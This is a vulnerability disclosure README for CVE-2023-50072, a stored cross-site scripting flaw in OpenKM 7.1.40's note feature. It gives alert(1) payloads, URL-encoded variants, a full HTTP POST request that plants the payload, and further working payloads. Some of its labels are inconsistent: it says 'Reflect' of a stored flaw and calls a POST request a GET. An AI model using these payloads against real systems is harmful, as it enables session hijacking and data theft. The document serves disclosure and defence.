# CVE-2023-50072

A stored cross-site scripting (XSS) vulnerability exists in OpenKM version 7.1.40 (dbb6e88) With Professional Extension that allows an authenticated user to upload a note on a file which acts as a stored XSS payload. Any user who opens the note of a document file will trigger the XSS.

Vulerable Parameter: **text**

## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)  
```
Payload : <img/src/onerror=alert(1)> 
FINAL Payload (URL encoded) : <image/src/onerror%3dalert(1)>
```
GET Request on [http://localhost/openkm/rest/note/nodes/NODE-ID] :
```
POST /openkm/rest/note/nodes/34bc430a-e3db-4efa-8289-3d0894010f67 HTTP/2
Host: EXAMPLE.COM
Cookie: lang=en-GB; JSESSIONID=EC6EF7B1DB85C3A839C9D3054095AA8E
Content-Length: 23
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
X-Requested-App: kcenter
Sec-Ch-Ua-Mobile: ?0
Authorization: OKM ey[REDACTED]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Platform: "Windows"
Origin: https://EXAMPLE.COM
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://EXAMPLE.COM/openkm
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

text=<image/src/onerror%3dalert(1)>
```

### Impact
Stored XSS allows attackers to inject malicious scripts into a web application, which get stored and executed when other users view the affected page. This can lead to theft of sensitive information, session hijacking, or distribution of malware.

### Screenshot
![openkm](https://github.com/ahrixia/CVE-2023-50072/assets/35935843/b9b8841b-5b59-4a34-8480-06722913e3d0)


### Other Working Payloads
```
Payload : <img src/onerror=alert(1)>
FINAL Payload (URL encoded) : <img%20src/onerror=alert(1)>
```

